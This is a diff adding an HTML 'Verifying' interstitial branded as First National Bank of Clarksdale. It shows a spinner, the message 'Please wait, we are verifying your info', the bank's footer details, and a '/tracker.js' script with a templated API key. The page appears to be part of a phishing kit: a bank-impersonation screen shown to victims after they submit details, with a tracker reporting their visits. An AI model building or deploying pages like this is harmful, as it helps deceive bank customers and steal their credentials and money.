@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying - First National Bank of Clarksdale</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: url('background.png') center center / cover no-repeat;
+            min-height: 100vh;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            position: relative;
+            padding: 20px 0;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+        }
+
+        .loading-container {
+            background: rgba(40, 42, 45, 0.98);
+            border-radius: 16px;
+            padding: 60px 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            position: relative;
+            z-index: 1;
+            margin: auto 20px;
+            margin-bottom: 100px;
+            text-align: center;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .logo-container img {
+            max-width: 560px;
+            width: 100%;
+            height: auto;
+        }
+
+        .loading-content {
+            margin-top: 40px;
+        }
+
+        .loading-message {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 30px;
+            border: 4px solid rgba(107, 123, 255, 0.2);
+            border-top: 4px solid #6b7bff;
+            border-radius: 50%;
+            -webkit-animation: spin 1s linear infinite;
+            animation: spin 1s linear infinite;
+        }
+
+        @-webkit-keyframes spin {
+            0% { -webkit-transform: rotate(0deg); transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); transform: rotate(360deg); }
+        }
+
+        @keyframes spin {
+            0% { -webkit-transform: rotate(0deg); transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #999;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            width: 100%;
+            text-align: center;
+            color: #888;
+            font-size: 11px;
+            z-index: 1;
+            padding: 20px;
+            line-height: 1.8;
+            background: rgba(20, 22, 25, 0.9);
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+        }
+
+        .footer-line {
+            display: block;
+            margin: 4px 0;
+        }
+
+        .footer a {
+            color: #6b7bff;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            color: #8b9bff;
+        }
+
+        .footer-divider {
+            margin: 0 8px;
+            color: #555;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 10px 0;
+            }
+
+            .loading-container {
+                padding: 40px 25px;
+                margin: 20px 15px;
+                max-width: calc(100% - 30px);
+                border-radius: 12px;
+            }
+
+            .logo-container {
+                margin-bottom: 40px;
+            }
+
+            .logo-container img {
+                max-width: 100%;
+                width: 280px;
+            }
+
+            .loading-message {
+                font-size: 18px;
+                margin-bottom: 12px;
+            }
+
+            .spinner {
+                width: 45px;
+                height: 45px;
+                margin-bottom: 25px;
+            }
+
+            .loading-text {
+                font-size: 14px;
+            }
+
+            .footer {
+                padding: 15px 10px;
+                font-size: 10px;
+                line-height: 1.6;
+            }
+
+            .footer-line {
+                font-size: 10px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .loading-container {
+                padding: 35px 20px;
+                margin: 15px 10px;
+            }
+
+            .logo-container img {
+                width: 240px;
+            }
+
+            .loading-message {
+                font-size: 16px;
+            }
+
+            .spinner {
+                width: 40px;
+                height: 40px;
+            }
+
+            .loading-text {
+                font-size: 13px;
+            }
+        }
+    </style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo-container">
+            <img src="logo.png" alt="Your Hometown Bank">
+        </div>
+
+        <div class="loading-content">
+            <div class="spinner"></div>
+            
+            <div class="loading-message">
+                Please wait, we are verifying your info
+            </div>
+            
+            <div class="loading-text">
+                This will only take a moment...
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <span class="footer-line">© 2026 First National Bank of Clarksdale <span class="footer-divider">•</span> (662) 627-3261</span>
+        <span class="footer-line"><a href="#">Privacy policy</a> <span class="footer-divider">•</span> Member FDIC</span>
+        <span class="footer-line"><a href="#">🏠 Equal Housing Lender</a></span>
+    </div>
+</body>
+</html>
